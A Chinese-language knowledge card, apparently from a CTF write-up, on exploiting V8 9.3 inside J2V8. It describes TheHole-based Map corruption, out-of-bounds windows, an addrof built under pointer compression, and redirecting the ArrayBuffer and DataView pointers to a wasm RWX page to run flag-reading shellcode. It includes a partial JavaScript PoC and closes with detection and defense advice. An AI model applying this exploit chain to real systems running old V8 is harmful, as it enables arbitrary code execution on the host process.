---
id: binary-pwn-browser-j2v8-thehole-map-corruption-wasm-rwx
title: J2V8 老版本 V8（9.3.345.11）TheHole + Map 状态破坏：小窗口 OOB 读 wasm RWX 并改写 ArrayBuffer/DataView 执行 shellcode
type: scenario
domain: binary
path: binary/pwn/browser
technique: j2v8-thehole-map-corruption-wasm-rwx
aliases:
- SU_BOX
- J2V8
- V8 9.3.345.11
- TheHole token
- Map 状态破坏
- corruptArrayLength
- wasm RWX 页
- ArrayBuffer backing store
- DataView data pointer
- CVE-2021-38003 路线
tags:
- v8
- j2v8
- browser
- thehole
- map
- oob
- wasm
- rwx
- shellcode
- pointer-compression
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V159
  verified_at: '2026-11-06T07:38:56+08:00'
  notes: 已对照原文核对：J2V8承载V8 9.3.345.11、DebugApp的Unsafe/addr/read64等调试增强、JSON.stringify异常作TheHole、Map状态破坏corruptArrayLength、wasm_view[14]取RWX、makeOobArray与makeAddressToolkit指针压缩、ArrayBuffer+0x28/DataView+0x30改写、wasm.entry执行shellcode均与原文一致。未验证点：PoC未在本机复跑；原文shellcode实际push的路径为/flag，卡片原理段写作open("flag")略有笔误，不影响链路；原文未给受影响版本区间，未设置versions；原文未提供sources/source_url。
---

## 一句话结论

在 J2V8 承载的 V8 9.3.345.11（Chrome 93 一代）上，利用 `JSON.stringify` 抛出的特殊异常对象作为 TheHole 标记参与 Map 操作，破坏 Map 内部状态并把受控长度写进数组头，得到小范围 OOB 窗口；先用该窗口读 `WebAssembly.Instance` 附近的 RWX 页地址，再用第二个窗口构造地址工具，最后把 `ArrayBuffer` 的 backing store 与 `DataView` 的 data pointer 都指向 RWX 页，写入并执行 shellcode 读 flag。

## 原理

- **宿主环境**：Java 程序从 stdin 读 JavaScript（以 `EOF` 行结束，限制 1MB），交给 J2V8 的 `V8.createV8Runtime()` 执行，只额外注册一个 `log` 回调。脚本在 V8 中运行，V8 与 Java 进程同地址空间，因此拿到 V8 堆对象的任意读写/代码执行即可在宿主进程执行 shellcode。
- **目标版本**：从 `libj2v8-linux-x86_64.so` 的字符串可识别出 V8 9.3.345.11（Chrome 93 一代），带指针压缩（pointer compression）。J2V8 与 d8 的外壳、堆布局和稳定性不同，公开的 d8 PoC 不能直接照搬，需要按 J2V8 的对象布局重调偏移。
- **调试增强**：题目给了 `App.java` 和 `linux-x86_64.jar`；本地改一个 `DebugApp`，用 Java `Unsafe` 和反射读 `V8Value.objectHandle`，注册 `addr/read64/read32/dump/write64/jgc`。这只是本地调试工具，不是远程利用的一部分，但它说明了 `V8Value.objectHandle` 就是原生对象地址，便于在 gdb 里对照 V8 堆布局。
- **TheHole 标记的获取**：`makeHole()` 构造一个自引用的大数组结构（数组元素指向自身，并塞入 0x800000 长度的字符串），对它调用 `JSON.stringify` 会抛异常；`catch` 捕获到的异常对象在后续 Map 操作中被当作 TheHole 使用。TheHole 是 V8 内部的特殊 oddball，正常 JS 不应能把它作为 Map 键；把它混入 Map 的键集合会触发异常的删除/查找状态。
- **Map 状态破坏与数组长度伪造**：`corruptArrayLength(key, len, hole)` 先建立 Map，依次 `set(1,1)`、`set(hole,1)`、`delete(hole)` 两次、`delete(1)`；随后分配 `pad` 与 `victim` 数组，再 `set(0x1c,-1)`、`set(key,len)`。TheHole 键留下的异常表状态使 Map 的内部表项错位，后续整型/对象键的写入落到 victim 数组头附近，把 length 字段改成期望值；返回的 victim 就带有一个小范围 OOB 窗口（文章实测更像“几十个槽位”的窗口，而不是任意大范围）。
- **窗口读 wasm RWX**：创建 `WebAssembly.Instance` 后，对 instance 调 `corruptArrayLength(wasm.instance, 0x20, ...)`，得到长度 0x20 的窗口数组；`wasm_view[14]` 解出的浮点数位模式就是一个页对齐、每次连接会变化的地址，形态符合 V8 为 wasm 代码分配的 RWX 映射。偏移 14 是本地按对象布局调出、再在远程反复对照得到的。
- **第二个 OOB 数组**：`makeOobArray()` 用同样的 Map 破坏套路，对 `new Array(1.1,1.1)` 设置 length 0xffff，得到一个可索引更大范围的 double 数组，作为后续地址工具。
- **地址工具与指针压缩**：V8 9.3 的堆对象指针是 32 位压缩偏移，真实地址 = cage_base + 压缩偏移。`makeAddressToolkit(oob)` 从 `oob[6]` 取出 float array 的 map（低 32 位），从 `oob[28]` 取出 object array 的 map，再从 `oob[0]` 的高 32 位得到 cage_base。`addrof(obj)` 临时把 object array 的 map 换成 float map，使 `object_array[0] = obj` 时对象指针被当成 double 存进元素，读出后取低 32 位；`untag` 做 `(ptr-1) & 0xffffffff` 去掉 tag 位；`addrOf(obj) = cage_base + untag(addrof(obj))`。
- **改写 backing store / data pointer**：`DataView` 的缓冲区对象 `ArrayBuffer` 在 +0x28 处是 backing store 指针，`DataView` 自身在 +0x30 处是 data pointer。通过 OOB 数组索引计算出这两个字段相对 `oob` 元素基址的槽位，把 RWX 地址写进去；此后 `ctrl.setUint8` 的写入直接落到 RWX 页，`wasm.entry()` 调用即执行 shellcode。
- **shellcode**：`open("flag", O_RDONLY)` → `read(fd, rsp, 0x100)` → `write(1, buf, n)` → `exit(0)`；字符串 `/flag` 通过 `push` 放在栈上。
- **为什么要拆成多个窗口**：文章尝试过“一个数组同时 addrof + fakeobj + 大范围 OOB”的漂亮链，但 J2V8 远程环境脆弱、堆布局不稳定；最终接受拆开做——一个窗口读 wasm instance 拿 RWX，一个窗口扩 OOB 做地址工具，一个窗口改 ArrayBuffer，一个窗口改 DataView，每步都只看一小段内存，成功率更高。

## 触发条件

- 目标使用 J2V8 承载的老版本 V8（文章为 9.3.345.11，Chrome 93 一代），且允许执行攻击者提供的 JavaScript。
- V8 未启用会阻断 TheHole/Map 破坏的额外缓解（如更严格的 Map 键校验、指针压缩外的沙箱隔离）；目标进程可创建 `WebAssembly.Instance`、`ArrayBuffer`、`DataView`。
- 攻击者能接受“每次连接重新调偏移”的不稳定性，或能按远程对象布局重调 wasm 窗口索引与 cage_base 取法。
- 本地有对应的 J2V8 `.so`/jar 可用于调试；远程则依赖可重复的创建顺序和固定偏移。

## 利用步骤

1. 用 `strings libj2v8-linux-x86_64.so` 确认 V8 版本（9.3.345.11）；用 `DebugApp` 的 `addr/read64/dump` 在本地确认 V8Value handle、ArrayBuffer/DataView/wasm instance 的字段偏移。
2. `makeHole()` 构造自引用大数组，`JSON.stringify` 抛异常，捕获异常对象作为 hole 标记。
3. `makeWasmExec()` 创建 wasm instance 与入口函数；`corruptArrayLength(wasm.instance, 0x20, hole)` 得到窗口数组，读 `wasm_view[14]` 解出 RWX 地址。
4. `makeOobArray()` 用同一 Map 破坏套路得到 length 0xffff 的 double 数组；`makeAddressToolkit(oob)` 建立 `addrof`/`addrOf`。
5. `new DataView(new ArrayBuffer(0x1000))`；用 `addrOf` 算出 `ctrl.buffer + 0x28` 与 `ctrl + 0x30` 在 `oob` 中的索引。
6. 把 RWX 地址写入这两个槽位，使 ArrayBuffer 的 backing store 和 DataView 的 data pointer 都指向 RWX 页。
7. 用 `ctrl.setUint8(i, byte)` 写入 shellcode。
8. 调用 `wasm.entry()` 执行 shellcode，读取并输出 flag。

## PoC

原文给出完整 JS；下面为最小骨架（省略 wasm 字节码与 shellcode 数组细节）：

```javascript
function makeHole() {
    let a = [], b = [];
    let spray = '"'.repeat(0x800000);
    a[20000] = spray;
    for (let i = 0; i < 10; i++) { a[i] = spray; b[i] = a; }
    try { JSON.stringify(b); } catch (hole) { return hole; }
}

function corruptArrayLength(key, len, hole) {
    let map = new Map();
    map.set(1, 1); map.set(hole, 1);
    map.delete(hole); map.delete(hole); map.delete(1);
    let pad = new Array(2).fill(1.1);
    let victim = new Array(4).fill(2.2);
    map.set(0x1c, -1);
    map.set(key, len);
    return victim;
}

let wasm = makeWasmExec();                       // new WebAssembly.Instance(...)
let wasm_view = corruptArrayLength(wasm.instance, 0x20, makeHole());
let rwx = ftoi(wasm_view[14]);                   // 小窗口读出 wasm RWX 页地址

let oob = makeOobArray();                        // length 0xffff 的 double 数组
let tools = makeAddressToolkit(oob);             // addrof / addrOf

let ctrl = new DataView(new ArrayBuffer(0x1000));
let base = tools.addrOf(oob) + 0x10n;
let buffer_index = Number(((tools.addrOf(ctrl.buffer) + 0x28n) - base) / 8n);
let view_index   = Number(((tools.addrOf(ctrl) + 0x30n) - base) / 8n);

oob[buffer_index] = itof(rwx);                   // ArrayBuffer + 0x28: backing store
oob[view_index]   = itof(rwx);                   // DataView + 0x30: data pointer
writeBytes(ctrl, buildFlagShellcode());          // 写入 RWX
wasm.entry();                                    // 执行 shellcode
```

shellcode 逻辑：`open("flag", 0)` → `read(fd, rsp, 0x100)` → `write(1, buf, n)` → `exit(0)`。原文的完整脚本还包含 `makeOobArray`、`makeAddressToolkit` 的 map 交换细节和 wasm 字节码；PoC 未在本会话执行。

## 变体与关联

- **CVE-2021-38003 路线**：文章参考的是该 CVE 暴露 TheHole/Map 破坏的思路，但没有把公开 d8 PoC 原样移植；J2V8 外壳与 d8 的堆布局不同，需要重新调 wasm 窗口索引、cage_base 取法和对象创建顺序。目标版本是否精确对应同一 CVE 未在原文确认，故本卡 `cve` 留空。
- **最终执行目标变体**：除 wasm RWX 页外，也可改 JIT code page、`ArrayBuffer` 的 backing store 指向 libc/堆，或直接构造 fake object 做任意读写；wasm RWX 是最省事的一档。
- **窗口策略变体**：若远程足够稳定，可尝试单一 OOB 数组完成 addrof/fakeobj/任意读写；J2V8 远程更适合多窗口、每步只碰一小段内存。
- **调试方法**：在 `Java_com_eclipsesource_v8_V8__1executeScript`、`createV8ArrayBufferBackingStore`、`initNewV8ArrayBuffer__JI`、`executeFunction__JJJJ` 下断，配合 `catch syscall mmap/mprotect` 观察 RWX 映射。
- 关联：[[binary-pwn-browser-v8-wasm-frame-state-type-confusion]]（另一类 V8 类型混淆 → addrof/fakeobj）、[[binary-pwn-browser-nvars-uint16-wrap-bytecode-slot-oob-fake-class-convert]]（JS 引擎 OOB 写 → 函数指针劫持）。

## 检测与防御

- **升级运行时**：升级 J2V8 内置的 V8 到包含 TheHole/Map 修复的版本；不要长期嵌入 Chrome 93 一代的旧 V8。
- **减少攻击面**：不需要 WebAssembly 时关闭 wasm；限制脚本大小不是安全边界；不要把 `Unsafe`、`V8Value.objectHandle` 等调试能力暴露给不可信脚本或远程用户。
- **进程隔离**：在独立低权限进程/沙箱中运行 V8，启用 seccomp 只允许必要 syscall；即使 V8 被突破，shellcode 也无法直接读 flag。
- **检测**：监控进程内出现匿名 RWX 映射、`mprotect` 把堆页改为可执行、以及 JS 进程突然执行 open/read/write 文件 syscall；对 `JSON.stringify` 超大自引用对象、异常 Map 键操作做启发式告警只能辅助，不能替代升级。
- **指针压缩**：指针压缩不是安全边界；cage 内的任意读写仍可改 ArrayBuffer/DataView 的指针字段，必须配合进程级隔离。
